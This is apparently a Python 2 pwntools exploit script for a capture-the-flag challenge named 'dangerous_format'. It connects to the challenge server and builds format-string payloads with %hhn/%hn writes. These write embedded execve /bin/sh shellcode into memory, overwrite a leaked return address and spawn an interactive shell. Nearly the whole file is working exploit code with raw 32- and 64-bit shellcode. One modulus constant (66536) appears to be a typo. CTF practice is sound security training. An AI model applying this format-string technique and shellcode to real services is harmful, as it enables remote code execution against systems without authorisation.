from pwn import *
context.log_level = 'debug'
TARGET = './format'
HOST = 'dangerous_format.problem.cpctf.space'
PORT = 3064

# r = process(TARGET)
r = remote(HOST, PORT)

gdb.attach(r, '''
set disable-randomization on
b*0x8048af3
b*0x8048a80
b*0x8048af3
''')
elf = ELF(TARGET)

_32_SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

target = 0x80d8000
def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r.recvuntil('name...')

payload = ''
in_length = 14
for i in range(in_length):
    payload += p32(target+12+i)


offset = in_length * 4
value = 0
for i in range(in_length):
    value += u8(_32_SHELLCODE[i]) << (8*i)
# print "value:", hex(value)

for i in range(in_length):
    payload += '%'
    c = (((value >> (i*8)) & 0xff) - offset) % 256
    if c == 0:
        c = 256
    payload += str(c)
    payload += 'c%'
    payload += str(20+i)
    payload += '$hhn'
    offset += c

print "length:", len(payload)
payload += '%5$p'
r.sendline(payload)


# 68

text = r.recvuntil('like?')
text = text.split('\n')[-2][-8:]
ret_target = int(text, 16) - 316 +0x278
print "-----", text

payload = ''
payload += p32(target+12+14)

for i in range(7):
    payload += p32(target+12+16+i)

payload += p32(ret_target)
payload += p32(ret_target+2)

offset = 7 * 4 + 4 + 8
v = u16(_32_SHELLCODE[14:16]) 
print "2byte:" , hex(v)
payload += '%'
payload += str((v - offset) % 65536)
payload += 'c%20$hn'
offset += (v - offset) % 65536

value = 0
for i in range(7):
    value += u8(_32_SHELLCODE[in_length+2+i]) << (8*i)

print "R value:", hex(value)
for i in range(7):
    payload += '%'
    c = (((value >> (i*8)) & 0xff) - offset) % 256
    if c == 0:
        c = 256
    payload += str(c)
    payload += 'c%'
    payload += str(21+i)
    payload += '$hhn'
    offset += c

payload += '%'
c = (0x800c-offset) % 65536
offset += c
payload += str(c)
payload += 'c%28$hn'
payload += '%'
payload += str((0x80d - offset-0x3e8) % 66536)
payload += 'c%29$hn'

r.sendline(payload)
print "ret target:", hex(ret_target)
r.interactive()
r.close()
